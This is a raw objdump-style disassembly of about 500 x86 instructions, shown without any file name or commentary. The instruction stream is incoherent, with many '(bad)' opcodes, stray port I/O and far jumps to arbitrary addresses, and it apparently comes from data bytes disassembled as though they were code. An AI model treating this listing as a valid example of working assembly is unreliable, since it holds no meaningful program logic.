  4b9877:	sub    DWORD PTR [edx+0x78c41c88],edx
  4b987d:	xor    bl,BYTE PTR [eax]
  4b987f:	and    al,0xe
  4b9881:	in     al,0xc0
  4b9883:	sbb    al,0xf6
  4b9885:	inc    BYTE PTR [esi-0x7e5aede4]
  4b988b:	adc    cl,BYTE PTR [esi]
  4b988d:	test   DWORD PTR [ebx+0x4b],edi
  4b9890:	(bad)  
  4b9891:	push   ecx
  4b9892:	mov    BYTE PTR [eax-0x3d],0x79
  4b9896:	or     al,0x30
  4b9898:	and    bh,al
  4b989a:	push   edx
  4b989b:	std    
  4b989c:	cli    
  4b989d:	shr    BYTE PTR [ebx+ebp*2],0xa8
  4b98a1:	push   ss
  4b98a2:	inc    esi
  4b98a3:	adc    eax,0xdcb2dfaf
  4b98a8:	mov    eax,0x168a4d46
  4b98ad:	push   edx
  4b98ae:	lea    edx,ds:0x1d684d25
  4b98b4:	sub    al,0x39
  4b98b6:	nop
  4b98b7:	push   esi
  4b98b8:	lock push ebx
  4b98ba:	mov    cl,0x40
  4b98bc:	dec    ebx
  4b98bd:	mov    bh,dh
  4b98bf:	enter  0x84e9,0x6b
  4b98c3:	fld    DWORD PTR [ebp+0x2140293c]
  4b98c9:	mov    fs,WORD PTR [edx]
  4b98cb:	test   DWORD PTR cs:[ecx],ebp
  4b98ce:	stos   BYTE PTR es:[edi],al
  4b98cf:	rcl    DWORD PTR [edx],1
  4b98d1:	(bad)  
  4b98d2:	es dec edx
  4b98d4:	mov    bl,0x89
  4b98d6:	ds dec edx
  4b98d8:	js     0x4b991c
  4b98da:	mov    eax,edi
  4b98dc:	bound  ecx,QWORD PTR [eax+0x7d10c118]
  4b98e2:	icebp  
  4b98e3:	sbb    edx,DWORD PTR [ebx+0x6115a708]
  4b98e9:	sub    al,0x66
  4b98eb:	pop    ds
  4b98ec:	mov    eax,0xe44b8436
  4b98f1:	fisttp QWORD PTR [edx-0x70]
  4b98f4:	inc    ecx
  4b98f5:	addr16 adc ebx,eax
  4b98f8:	out    0x44,eax
  4b98fa:	xchg   dh,cl
  4b98fc:	scas   al,BYTE PTR es:[edi]
  4b98fd:	adc    DWORD PTR [edi],ebx
  4b98ff:	loopne 0x4b98d1
  4b9901:	(bad)  
  4b9902:	je     0x4b995c
  4b9904:	fiadd  DWORD PTR [ecx-0x51]
  4b9907:	xchg   esp,eax
  4b9908:	daa    
  4b9909:	xor    DWORD PTR [eax+esi*2],0x8fada0b0
  4b9910:	call   0x24d69a39
  4b9915:	dec    edi
  4b9916:	cmp    ah,BYTE PTR [edx]
  4b9918:	into   
  4b9919:	jnp    0x4b996c
  4b991b:	test   DWORD PTR [esi],ecx
  4b991d:	mov    al,ds:0x5d291a8d
  4b9922:	retf   0x4048
  4b9925:	std    
  4b9926:	lock aaa 
  4b9928:	loop   0x4b990b
  4b992a:	or     esp,ecx
  4b992c:	push   edi
  4b992d:	push   cs
  4b992e:	jmp    0x4b998d
  4b9930:	push   ebx
  4b9931:	mov    BYTE PTR [ebx+edi*1],0x0
  4b9935:	or     ebp,DWORD PTR [eax+eiz*2-0x4b]
  4b9939:	jns    0x4b98f3
  4b993b:	inc    ebp
  4b993c:	push   ebx
  4b993d:	rcl    BYTE PTR [ebx+0x7a],0x48
  4b9941:	sub    ch,BYTE PTR [ebx+0x1b]
  4b9944:	ds adc eax,0xe482d250
  4b994a:	push   edi
  4b994b:	adc    DWORD PTR [edi+0x49],eax
  4b994e:	in     eax,dx
  4b994f:	jp     0x4b99aa
  4b9951:	fisub  WORD PTR [ebx+0x45]
  4b9954:	test   BYTE PTR [ecx+0x58],dl
  4b9957:	jmp    0xbdac5aa1
  4b995c:	shl    DWORD PTR [ebx],0xbc
  4b995f:	push   edx
  4b9960:	and    eax,DWORD PTR [esp+ebx*2-0x3aae4fe6]
  4b9967:	and    BYTE PTR [edx-0x25fcb60],dl
  4b996d:	inc    edi
  4b996e:	pop    edx
  4b996f:	add    edx,DWORD PTR [esi]
  4b9971:	addr16 das 
  4b9973:	add    BYTE PTR [ebx+0x23],0x2d
  4b9977:	sub    ebp,DWORD PTR [ebx]
  4b9979:	enter  0xad23,0x94
  4b997d:	xchg   esi,eax
  4b997e:	dec    ebp
  4b997f:	adc    al,0xd2
  4b9981:	cli    
  4b9982:	ss fdivr st,st(0)
  4b9985:	or     BYTE PTR [edi+0x1a],ah
  4b9988:	mov    ebp,0x4b0065d4
  4b998d:	cmp    ch,BYTE PTR [ebx]
  4b998f:	shr    BYTE PTR ds:0xb5f9985a,1
  4b9995:	xchg   edi,eax
  4b9996:	out    dx,eax
  4b9997:	jmp    0x2209:0x69c6bd16
  4b999e:	and    al,0x29
  4b99a0:	and    al,0x94
  4b99a2:	mov    ds:0x6f1b1104,al
  4b99a7:	adc    ah,BYTE PTR [ecx]
  4b99a9:	xchg   edi,eax
  4b99aa:	stos   BYTE PTR es:[edi],al
  4b99ab:	stos   DWORD PTR es:[edi],eax
  4b99ac:	jne    0x4b99e0
  4b99ae:	mov    ch,0x84
  4b99b0:	pop    es
  4b99b1:	push   esi
  4b99b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b99b3:	cdq    
  4b99b4:	(bad)  
  4b99b6:	bt     DWORD PTR [ecx-0x40],ebx
  4b99ba:	shl    DWORD PTR [edi-0x4e],0x95
  4b99be:	dec    edx
  4b99bf:	dec    ecx
  4b99c0:	inc    ebx
  4b99c1:	sub    DWORD PTR [esi],esp
  4b99c3:	adc    DWORD PTR [edx-0x4e60fd96],edi
  4b99c9:	inc    eax
  4b99ca:	shl    BYTE PTR [edi-0x44],cl
  4b99cd:	into   
  4b99ce:	adc    DWORD PTR [edi],esi
  4b99d0:	(bad)  
  4b99d2:	mov    cl,cl
  4b99d4:	push   ecx
  4b99d5:	sub    ebx,esp
  4b99d7:	fldcw  WORD PTR [edx+0x55]
  4b99da:	mov    bl,BYTE PTR [edx+0xd]
  4b99dd:	ins    BYTE PTR es:[edi],dx
  4b99de:	xor    bh,BYTE PTR [esi+0x6365f45]
  4b99e4:	js     0x4b996e
  4b99e6:	mov    BYTE PTR [eax-0x17],bh
  4b99e9:	in     al,dx
  4b99ea:	or     esi,DWORD PTR [eax+eax*1+0x2073da99]
  4b99f1:	inc    edx
  4b99f2:	mov    BYTE PTR [ecx+eiz*4+0x71060fec],al
  4b99f9:	sbb    bl,bl
  4b99fb:	cmc    
  4b99fc:	hlt    
  4b99fd:	inc    eax
  4b99fe:	cmp    eax,0x5630c719
  4b9a03:	(bad)  
  4b9a04:	into   
  4b9a05:	js     0x4b9a5f
  4b9a07:	jecxz  0x4b9a61
  4b9a09:	rol    esi,1
  4b9a0b:	rcl    BYTE PTR [eax+0x932e648],1
  4b9a11:	push   ebx
  4b9a12:	scas   al,BYTE PTR es:[edi]
  4b9a13:	and    esi,DWORD PTR [edx]
  4b9a15:	sub    ecx,0xa44e2f01
  4b9a1b:	xor    eax,0xf8039405
  4b9a20:	push   es
  4b9a21:	mov    edx,0x687f7808
  4b9a26:	push   ebp
  4b9a27:	sti    
  4b9a28:	push   edx
  4b9a29:	pusha  
  4b9a2a:	or     edx,DWORD PTR [esi-0x1352c2e]
  4b9a30:	std    
  4b9a31:	jns    0x4b9a3d
  4b9a33:	fsub   DWORD PTR [eax]
  4b9a35:	pop    ebp
  4b9a36:	in     al,0x7d
  4b9a38:	jp     0x4b99c5
  4b9a3a:	into   
  4b9a3b:	imul   esp,ebx,0x1fba2209
  4b9a41:	clc    
  4b9a42:	push   eax
  4b9a43:	or     ebp,DWORD PTR [eax+0x11]
  4b9a46:	pop    ds
  4b9a47:	push   ss
  4b9a48:	sub    al,BYTE PTR [edx+0x4a]
  4b9a4b:	les    esp,FWORD PTR [esi+ecx*4+0x22173c2]
  4b9a52:	(bad)  
  4b9a53:	mov    ebp,0x3c36c826
  4b9a58:	adc    ecx,DWORD PTR [edx+0xb75fe45]
  4b9a5e:	sbb    ebx,DWORD PTR [ecx]
  4b9a60:	sub    eax,0x3d0178e3
  4b9a65:	je     0x4b9add
  4b9a67:	addr16 in al,dx
  4b9a69:	sbb    esp,esi
  4b9a6b:	add    al,0xc0
  4b9a6d:	push   cs
  4b9a6e:	push   esi
  4b9a6f:	xchg   ebx,eax
  4b9a70:	inc    esp
  4b9a71:	mov    esp,0x42d04c02
  4b9a76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b9a77:	stc    
  4b9a78:	adc    eax,DWORD PTR [ecx]
  4b9a7a:	sti    
  4b9a7b:	enter  0xda74,0x82
  4b9a7f:	inc    esp
  4b9a80:	(bad)  
  4b9a81:	mov    al,0x6f
  4b9a83:	add    BYTE PTR [edi-0xb8a03f7],ch
  4b9a89:	fwait
  4b9a8a:	in     eax,dx
  4b9a8b:	inc    eax
  4b9a8c:	xchg   edx,eax
  4b9a8d:	jns    0x4b9ab2
  4b9a8f:	mov    ecx,DWORD PTR [ebx+0x455d8ac]
  4b9a95:	adc    dl,BYTE PTR [eax]
  4b9a97:	adc    eax,0x3a83ddbf
  4b9a9c:	xchg   esp,eax
  4b9a9d:	or     al,0x39
  4b9a9f:	jb     0x4b9aa5
  4b9aa1:	je     0x4b9af9
  4b9aa3:	and    eax,0x4
  4b9aa6:	sub    cl,BYTE PTR [ecx-0x19d1bb0a]
  4b9aac:	call   0x29fa5f99
  4b9ab1:	jns    0x4b9ab7
  4b9ab3:	add    al,BYTE PTR [ecx]
  4b9ab5:	mov    ebp,DWORD PTR [esp+eiz*4+0x28b2d14f]
  4b9abc:	or     dh,BYTE PTR [edi-0x69945a7c]
  4b9ac2:	jne    0x4b9b43
  4b9ac4:	jbe    0x4b9a74
  4b9ac6:	das    
  4b9ac7:	scas   al,BYTE PTR es:[edi]
  4b9ac8:	or     DWORD PTR [edx+0x3f071300],ebx
  4b9ace:	xor    bl,BYTE PTR [ecx-0x657dbc8b]
  4b9ad4:	nop
  4b9ad5:	es dec ecx
  4b9ad7:	mov    eax,ds:0x27cb6c08
  4b9adc:	(bad)  
  4b9add:	push   edx
  4b9ade:	push   eax
  4b9adf:	lods   eax,DWORD PTR ds:[esi]
  4b9ae0:	sbb    BYTE PTR [ebx],dl
  4b9ae2:	inc    ecx
  4b9ae3:	cmp    eax,0x4c02d7aa
  4b9ae8:	mov    ds:0x6c296027,al
  4b9aed:	push   ds
  4b9aee:	and    ah,BYTE PTR [ecx+0x55]
  4b9af1:	pop    es
  4b9af2:	aas    
  4b9af3:	ret    
  4b9af4:	jge    0x4b9afe
  4b9af6:	pushf  
  4b9af7:	sar    BYTE PTR [eax-0x75],0x3c
  4b9afb:	mov    ecx,0x23503723
  4b9b00:	lods   eax,DWORD PTR ds:[esi]
  4b9b01:	imul   esi,DWORD PTR [edi],0x805f7b55
  4b9b07:	sbb    eax,0x43c76168
  4b9b0c:	ror    DWORD PTR [ebx+0x1c08b1a8],cl
  4b9b12:	sbb    DWORD PTR [ebx],0x21
  4b9b15:	dec    esp
  4b9b17:	sbb    bl,BYTE PTR [ebx]
  4b9b19:	inc    ebx
  4b9b1a:	call   0x27b5:0xbae19343
  4b9b21:	sbb    eax,DWORD PTR [esi+esi*1]
  4b9b24:	xchg   ebx,eax
  4b9b25:	lods   al,BYTE PTR ds:[esi]
  4b9b26:	mov    DWORD PTR [ecx],edi
  4b9b28:	sbb    DWORD PTR [ebx+edx*1],eax
  4b9b2b:	ins    BYTE PTR es:[edi],dx
  4b9b2c:	mov    edi,0x47189f2
  4b9b31:	stc    
  4b9b32:	imul   esi,DWORD PTR [eax*1+0x32184a76],0xda446d36
  4b9b3d:	xor    al,al
  4b9b3f:	inc    ebx
  4b9b40:	sbb    BYTE PTR [ebp-0x3533e9f5],ah
  4b9b46:	push   ecx
  4b9b47:	push   esp
  4b9b48:	shl    BYTE PTR [ecx+0x11],cl
  4b9b4b:	aam    0xd8
  4b9b4d:	jmp    DWORD PTR [eax+eiz*4+0x2918f0c6]
  4b9b54:	dec    esi
  4b9b55:	add    eax,0x90ad8c0e
  4b9b5a:	pop    es
  4b9b5b:	ja     0x4b9ba5
  4b9b5d:	test   DWORD PTR [ecx-0x52ff63f8],edi
  4b9b63:	or     eax,DWORD PTR [eax+0xf0ad61b]
  4b9b69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b9b6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b9b6b:	push   eax
  4b9b6c:	xchg   edx,eax
  4b9b6d:	cwde   
  4b9b6e:	je     0x4b9b03
  4b9b70:	mov    DWORD PTR [edi-0x5d],eax
  4b9b73:	jmp    0x529bf1f8
  4b9b78:	mov    DWORD PTR [edx+edx*1+0x5a98df8],esi
  4b9b7f:	cld    
  4b9b80:	mov    ebp,0x79fe468d
  4b9b85:	jmp    0x73e07254
  4b9b8a:	js     0x4b9b8f
  4b9b8c:	inc    esi
  4b9b8d:	fadd   QWORD PTR [esi+0x10]
  4b9b90:	or     edi,DWORD PTR [eax+0x6d]
  4b9b93:	fldenv [edi+eax*1]
  4b9b96:	rol    BYTE PTR [edx+0x7d],cl
  4b9b99:	(bad)  
  4b9b9a:	sbb    dl,al
  4b9b9c:	jb     0x4b9bbe
  4b9b9e:	rcr    edi,cl
  4b9ba0:	loope  0x4b9b26
  4b9ba2:	mov    al,ds:0xdb102fa4
  4b9ba7:	push   es
  4b9ba8:	fldz   
  4b9baa:	mov    eax,ds:0xed5a6ba8
  4b9baf:	and    al,0x7
  4b9bb1:	jo     0x4b9c00
  4b9bb3:	arpl   bp,bx
  4b9bb5:	fdiv   DWORD PTR [ebp-0x42b9e346]
  4b9bbb:	inc    edx
  4b9bbc:	cmp    dh,cl
  4b9bbe:	jo     0x4b9bdc
  4b9bc0:	aas    
  4b9bc1:	or     al,BYTE PTR [ecx+0x264a675a]
  4b9bc7:	mov    esp,0xf37f0b1b
  4b9bcc:	pop    eax
  4b9bcd:	dec    edi
  4b9bce:	bound  ebp,QWORD PTR [ebx+edi*1]
  4b9bd1:	sbb    BYTE PTR [ecx+0x7],cl
  4b9bd4:	add    DWORD PTR [ecx+0x40d81bac],0x43
  4b9bdb:	sub    al,bh
  4b9bdd:	daa    
  4b9bde:	inc    edi
  4b9bdf:	lock adc eax,0xab1d8e62
  4b9be5:	adc    al,0x17
  4b9be7:	or     eax,0x24f75611
  4b9bec:	and    al,0xeb
  4b9bee:	add    eax,0xec03207b
  4b9bf3:	shl    DWORD PTR [esi+0x1079619b],0x61
  4b9bfa:	and    al,al
  4b9bfc:	adc    DWORD PTR [ebx+eiz*1+0x10],edi
  4b9c00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b9c01:	or     al,0x7
  4b9c03:	xor    cl,BYTE PTR [ebp-0x46]
  4b9c06:	and    edx,DWORD PTR [esi+0x48]
  4b9c09:	int3   
  4b9c0a:	sub    eax,0x848c7208
  4b9c0f:	push   ds
  4b9c10:	out    0x9,al
  4b9c12:	add    DWORD PTR [ebx-0xa87ffac],esi
  4b9c18:	test   BYTE PTR [esp+edi*2+0x482fcaca],ah
  4b9c1f:	add    BYTE PTR [edi-0x61],dl
  4b9c22:	xor    BYTE PTR [edx-0x64b3a939],dh
  4b9c28:	inc    edx
  4b9c29:	adc    dl,BYTE PTR [ecx+0x5]
  4b9c2c:	xchg   esp,eax
  4b9c2d:	je     0x4b9c35
  4b9c2f:	push   es
  4b9c30:	xchg   esi,eax
  4b9c31:	xor    al,0x69
  4b9c33:	adc    BYTE PTR [edi],ah
  4b9c35:	test   BYTE PTR [edi+0x141eb2b7],dh
  4b9c3b:	pop    ebp
  4b9c3c:	add    al,0x70
  4b9c3e:	lock scas al,BYTE PTR es:[edi]
  4b9c40:	push   eax
  4b9c41:	rcl    dh,0x97
  4b9c44:	call   0xc38b:0x7a773d02
  4b9c4b:	xor    DWORD PTR [esp+ecx*4],0x4d5508fa
  4b9c52:	sbb    DWORD PTR [edx+ebp*2-0x493619cb],ebx
  4b9c59:	lahf   
  4b9c5a:	in     eax,dx
  4b9c5b:	and    BYTE PTR [ebp+0x65],cl
  4b9c5e:	xor    al,0x70
  4b9c60:	sub    esi,0x30
  4b9c63:	xchg   ebx,eax
  4b9c64:	adc    al,0x61
  4b9c66:	mov    eax,ds:0x712cbd14
  4b9c6b:	dec    ebp
  4b9c6c:	ss add al,0x3a
  4b9c6f:	jno    0x4b9c92
  4b9c71:	add    ebx,DWORD PTR [ebx+0x1a]
  4b9c74:	sbb    eax,0x4b3e0cc7
  4b9c79:	adc    al,0x36
  4b9c7b:	jle    0x4b9c32
  4b9c7d:	test   DWORD PTR [eax-0x52],ecx
  4b9c80:	lea    esi,[edx+eax*2-0x30]
  4b9c84:	jmp    0x4b9c43
  4b9c86:	push   ecx
  4b9c87:	js     0x4b9c59
  4b9c89:	sub    al,0xb2
  4b9c8b:	xor    al,0x8b
  4b9c8d:	inc    esi
  4b9c8e:	jle    0x4b9c59
  4b9c90:	in     eax,dx
  4b9c91:	push   eax
  4b9c92:	call   0x38f5617
  4b9c97:	lahf   
  4b9c98:	mov    WORD PTR [edi+0x9],fs
  4b9c9b:	pop    esi
  4b9c9c:	mov    ds:0x6e6aeb2,eax
  4b9ca1:	xor    eax,0x58e98b28
  4b9ca6:	or     al,0x87
  4b9ca8:	mov    esp,0x14048f50
  4b9cad:	push   ecx
  4b9cae:	push   edx
  4b9caf:	rcr    DWORD PTR [esi],cl
  4b9cb1:	xor    ah,BYTE PTR [ebx+ebp*8+0x10]
  4b9cb5:	addr16 push 0x221b1892
  4b9cbb:	xlat   BYTE PTR ds:[ebx]
  4b9cbc:	xor    ah,BYTE PTR [ebp+0x60]
  4b9cbf:	cdq    
  4b9cc0:	(bad)  
  4b9cc1:	mov    ds:0x63bb832,eax
  4b9cc6:	dec    ebp
  4b9cc7:	dec    eax
  4b9cc8:	aad    0x43
  4b9cca:	hlt    
  4b9ccb:	sub    DWORD PTR [edx],esp
  4b9ccd:	push   es
  4b9cce:	xchg   BYTE PTR [ebp-0x40],bh
  4b9cd1:	xor    eax,0x79be06f0
  4b9cd6:	or     al,BYTE PTR [eax]
  4b9cd8:	aas    
  4b9cd9:	lea    edi,[ebp+0x522c4b84]
  4b9cdf:	push   ss
  4b9ce0:	add    ebx,DWORD PTR [edi]
  4b9ce2:	inc    esi
  4b9ce3:	mov    ch,BYTE PTR [ecx-0x67]
  4b9ce6:	test   eax,0x210431b8
  4b9ceb:	imul   ecx,DWORD PTR [esi],0x50449508
  4b9cf1:	mov    esi,0xb84178c3
  4b9cf6:	adc    DWORD PTR [esi],eax
  4b9cf8:	adc    BYTE PTR [edi],0xdd
  4b9cfb:	ret    0x70
  4b9cfe:	scas   al,BYTE PTR es:[edi]
  4b9cff:	jle    0x4b9cc5
  4b9d01:	jb     0x4b9ca1
  4b9d03:	add    eax,0x58698a43
  4b9d08:	mov    cs,WORD PTR [ecx]
  4b9d0a:	cs fs loop 0x4b9d15
  4b9d0e:	addr16 add esp,esp
  4b9d11:	add    ebp,DWORD PTR [edi]
  4b9d13:	lock pop ebp
  4b9d15:	add    al,0xbb
  4b9d17:	add    ch,bl
  4b9d19:	pop    es
  4b9d1a:	mov    DWORD PTR [ebx],0x414ad35
  4b9d20:	add    eax,0xc88a95e1
  4b9d25:	adc    eax,0xda790f05
  4b9d2a:	mov    ss,WORD PTR [edi-0x29]
  4b9d2d:	into   
  4b9d2e:	ficom  DWORD PTR [edx-0x5f]
  4b9d31:	fld    DWORD PTR [esi]
  4b9d33:	mov    bl,BYTE PTR [ecx-0xd]
  4b9d36:	xor    al,0x9f
  4b9d38:	out    0x28,eax
  4b9d3a:	push   es
  4b9d3b:	loope  0x4b9d15
  4b9d3d:	stos   DWORD PTR es:[edi],eax
  4b9d3e:	fwait
  4b9d3f:	cdq    
  4b9d40:	jbe    0x4b9ce0
  4b9d42:	out    0x28,al
  4b9d44:	fisub  DWORD PTR [eax]
  4b9d46:	mov    WORD PTR [ecx],es
  4b9d48:	add    dl,BYTE PTR [ecx]
  4b9d4a:	adc    ecx,ecx
  4b9d4c:	sub    DWORD PTR [ecx],eax
  4b9d4e:	add    al,BYTE PTR [ecx]
  4b9d50:	xchg   esi,eax
  4b9d51:	inc    esi
  4b9d52:	add    dl,BYTE PTR [esi-0x37]
  4b9d55:	stos   BYTE PTR es:[edi],al
  4b9d56:	xchg   esp,eax
  4b9d57:	mov    cl,0x85
  4b9d59:	or     eax,0xa815ab0b
  4b9d5e:	mov    DWORD PTR [ebp+eax*2-0x5416dc93],ebx
  4b9d65:	xchg   BYTE PTR [ecx],bh
  4b9d67:	mov    ebx,DWORD PTR ds:0x9e10ac
  4b9d6d:	lods   al,BYTE PTR ds:[esi]
  4b9d6e:	lods   al,BYTE PTR ds:[esi]
  4b9d6f:	or     eax,0x57586fee
  4b9d74:	enter  0x16f8,0x15
  4b9d78:	test   al,0x87
  4b9d7a:	sub    DWORD PTR [ebx+0x736381a5],ebp
  4b9d80:	mov    eax,ds:0xc6e32e56
  4b9d85:	or     al,0xf5
  4b9d87:	mov    eax,0x61986d7b
  4b9d8c:	test   edi,esi
  4b9d8e:	sub    ah,BYTE PTR [edi+0x56]
  4b9d91:	ins    BYTE PTR es:[edi],dx
  4b9d92:	adc    eax,DWORD PTR [ebp+0x19946913]
  4b9d98:	push   esi
  4b9d99:	sub    BYTE PTR [ebx-0x5fb35629],dl
  4b9d9f:	js     0x4b9d85
  4b9da1:	iret   
  4b9da2:	pop    esi
  4b9da3:	push   0x2701ab17
  4b9da8:	or     DWORD PTR [ebx+0x3e],eax
  4b9dab:	fadd   DWORD PTR [ebp-0x6dc18825]
  4b9db1:	add    DWORD PTR [edx],0x17
  4b9db4:	push   ebx
  4b9db5:	jnp    0x11fc09fc
  4b9dbb:	dec    edx
  4b9dbc:	pop    ecx
  4b9dbd:	cwde   
  4b9dbe:	adc    al,0x11
  4b9dc0:	data16 or al,0x7c
  4b9dc3:	cmp    BYTE PTR [edx],ch
  4b9dc5:	and    ah,BYTE PTR [ebx]
  4b9dc7:	mov    fs,esp
  4b9dc9:	fild   WORD PTR [ecx]
  4b9dcb:	js     0x4b9d51
  4b9dcd:	jo     0x4b9dad
  4b9dcf:	mov    esp,0x9195c7b4
  4b9dd4:	or     DWORD PTR [eax+esi*8+0xffd0f6d],ecx
  4b9ddb:	adc    al,0xc1
  4b9ddd:	popa   
  4b9dde:	and    eax,0x282c6d1c
  4b9de3:	xchg   esp,eax
  4b9de4:	jl     0x4b9ded
  4b9de6:	mov    eax,DWORD PTR [eax+0xe]
  4b9de9:	mov    eax,0x74438ef9
  4b9dee:	jo     0x4b9e14
  4b9df0:	dec    eax
  4b9df1:	xor    esi,esi
  4b9df3:	fiadd  WORD PTR [eax]
  4b9df5:	aam    0x90
  4b9df7:	add    BYTE PTR [edx-0x65],bh
  4b9dfa:	xor    ebp,DWORD PTR ds:0x391d4be0
  4b9e00:	cwde   
  4b9e01:	and    eax,0x488a1a35
  4b9e06:	jns    0x4b9d9f
  4b9e08:	mov    WORD PTR [esi],ds
  4b9e0a:	push   eax
  4b9e0b:	fist   WORD PTR [ebx+edi*2]
  4b9e0e:	inc    eax
  4b9e0f:	call   0xcf7c:0x647436d9
  4b9e16:	popa   
  4b9e17:	push   esp
  4b9e18:	push   edx
  4b9e19:	ins    BYTE PTR es:[edi],dx
  4b9e1a:	pop    eax
  4b9e1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b9e1c:	xor    DWORD PTR ds:0xe948c401,ecx
  4b9e22:	sub    al,0x6e
  4b9e24:	or     esp,0xccf43744
  4b9e2a:	jmp    0x4b9e4f
  4b9e2c:	push   esi
  4b9e2d:	fstp   DWORD PTR es:[ecx+0x67]
  4b9e31:	nop
  4b9e32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b9e33:	out    dx,al
  4b9e34:	movhps QWORD PTR [eax],xmm1
  4b9e37:	dec    esp
  4b9e38:	sub    al,0x6
  4b9e3a:	sbb    eax,0x16a0147f
  4b9e3f:	test   DWORD PTR [esi-0x7942ff14],ecx
  4b9e45:	adc    eax,0xac3f4853
  4b9e4a:	nop
  4b9e4b:	pop    esi
  4b9e4c:	mov    ds:0xf6db6e0b,al
  4b9e51:	xor    DWORD PTR [ebx-0x7c43fa94],eax
  4b9e57:	test   BYTE PTR [edi+0x10],dl
  4b9e5a:	mov    eax,esp
  4b9e5c:	inc    ecx
  4b9e5d:	popf   
  4b9e5e:	and    BYTE PTR [eax+ebx*1],cl
  4b9e61:	mov    ebp,0x4bd1546c
  4b9e66:	add    DWORD PTR [ebx+0xb],ecx
  4b9e69:	inc    ebx
  4b9e6a:	das    
  4b9e6b:	aaa    
  4b9e6c:	add    BYTE PTR [ebx],ch
  4b9e6e:	pop    edi
  4b9e6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b9e70:	popa   
  4b9e71:	xchg   esp,eax
  4b9e72:	sbb    al,0x5a
  4b9e74:	inc    edi
  4b9e75:	xchg   DWORD PTR [edx+0x49],edi
  4b9e78:	rol    BYTE PTR [ebp-0x31],0x28
  4b9e7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b9e7d:	cwde   
  4b9e7e:	pop    ecx
  4b9e7f:	and    BYTE PTR [esi-0x3c],dl
  4b9e82:	jmp    0x4b9eb4
  4b9e84:	xor    ebp,eax
  4b9e86:	lea    ebx,[eax]
  4b9e88:	xadd   BYTE PTR [ecx],al
  4b9e8b:	push   edx
  4b9e8c:	sbb    eax,0x9bab017d
  4b9e91:	and    al,0x34
  4b9e93:	lods   eax,DWORD PTR ds:[esi]
  4b9e94:	daa    
  4b9e95:	imul   esp,DWORD PTR [ebp+0x22794924],0x650190f0
  4b9e9f:	mov    edi,DWORD PTR [eax+eax*2]
  4b9ea2:	sbb    BYTE PTR ds:0x307330a3,dh
  4b9ea8:	adc    DWORD PTR [ebp-0x605eda3b],eax
  4b9eae:	test   BYTE PTR [edi+0x49a1458c],bl
  4b9eb4:	or     BYTE PTR ds:0x353112a2,al
  4b9eba:	xor    DWORD PTR [eax+0x32],0x1276e076
  4b9ec1:	out    0xab,eax
  4b9ec3:	in     al,0x8
  4b9ec5:	stos   BYTE PTR es:[edi],al
  4b9ec6:	adc    edx,DWORD PTR [eax]
  4b9ec8:	jmp    0x4b9e85
  4b9eca:	test   eax,0x39b23434
  4b9ecf:	js     0x4b9f13
  4b9ed1:	sbb    BYTE PTR [esi+0x7c],cl
  4b9ed4:	mov    al,ds:0x51d4b970
  4b9ed9:	push   edx
  4b9eda:	mov    eax,DWORD PTR [edi-0x75]
  4b9edd:	retf   0x943a
  4b9ee0:	add    eax,0xd587cb7d
  4b9ee5:	js     0x4b9e99
  4b9ee7:	add    esp,DWORD PTR [ecx-0x6c]
  4b9eea:	push   edx
  4b9eeb:	mov    al,0xdb
  4b9eed:	xchg   esi,eax
  4b9eee:	push   edx
  4b9eef:	sbb    bl,BYTE PTR [esi+0x4]
  4b9ef2:	das    
  4b9ef3:	adc    edx,edi
  4b9ef5:	leave  
  4b9ef6:	jl     0x4b9f3a
  4b9ef8:	seto   al
  4b9efb:	pextrw eax,(bad),0xc5
  4b9efd:	add    DWORD PTR [ebx-0x48],0x38
  4b9f01:	mov    ch,BYTE PTR [eax-0x1d9c32e8]
  4b9f07:	adc    BYTE PTR [edx-0xae3d874],bh
  4b9f0d:	xor    BYTE PTR [edi],0xa9
  4b9f10:	jnp    0x4b9f5b
  4b9f12:	fs je  0x4b9f27
  4b9f15:	xor    al,0x97
  4b9f17:	pop    edi
  4b9f18:	(bad)  
  4b9f19:	int    0x80
  4b9f1b:	and    ebx,ebp
  4b9f1d:	call   0x6517cf9a
  4b9f22:	dec    edx
  4b9f23:	(bad)  
  4b9f24:	adc    al,0xf
  4b9f26:	iret   
  4b9f27:	push   eax
  4b9f28:	pop    eax
  4b9f29:	mov    esp,0x3e0f1759
  4b9f2e:	jne    0x4b9f21
  4b9f30:	(bad)  
  4b9f32:	add    DWORD PTR [esi],0x11
  4b9f35:	cdq    
  4b9f36:	jmp    0x4b9f70
  4b9f38:	or     dh,BYTE PTR [esp+ebx*2]
  4b9f3b:	mov    al,0xd2
  4b9f3d:	dec    ebp
  4b9f3e:	adc    dh,dl
  4b9f40:	add    eax,0xed2113ea
  4b9f45:	lods   eax,DWORD PTR ds:[esi]
  4b9f46:	add    al,ah
  4b9f48:	scas   al,BYTE PTR es:[edi]
  4b9f49:	and    BYTE PTR [ebx+0x76ad0c24],cl
  4b9f4f:	rcr    BYTE PTR [edi+0x4a],0xd4
  4b9f53:	pop    esi
  4b9f54:	cmp    DWORD PTR [ebx-0x1af3d4c],0xffffffdc
  4b9f5b:	test   BYTE PTR [edx],dl
  4b9f5d:	add    ecx,DWORD PTR [ebx+0x57]
  4b9f60:	fdivr  st,st(5)
  4b9f62:	add    BYTE PTR [ecx+0x6a178d97],0x5c
  4b9f69:	cwde   
  4b9f6a:	(bad)  
  4b9f6b:	retf   
  4b9f6c:	inc    ebp
  4b9f6d:	jp     0x4b9f70
  4b9f6f:	sbb    eax,DWORD PTR cs:[edx-0x75]
  4b9f73:	and    DWORD PTR [ecx],ecx
  4b9f75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b9f76:	(bad)  
  4b9f77:	fwait
  4b9f78:	push   edx
  4b9f79:	dec    edi
  4b9f7a:	jne    0x4b9f2c
  4b9f7c:	test   eax,0x5ea14bdd
  4b9f81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b9f82:	xor    ch,BYTE PTR [edx]
  4b9f84:	scas   eax,DWORD PTR es:[edi]
  4b9f85:	adc    dl,0x1b
  4b9f88:	adc    cl,0xdc
  4b9f8b:	sti    
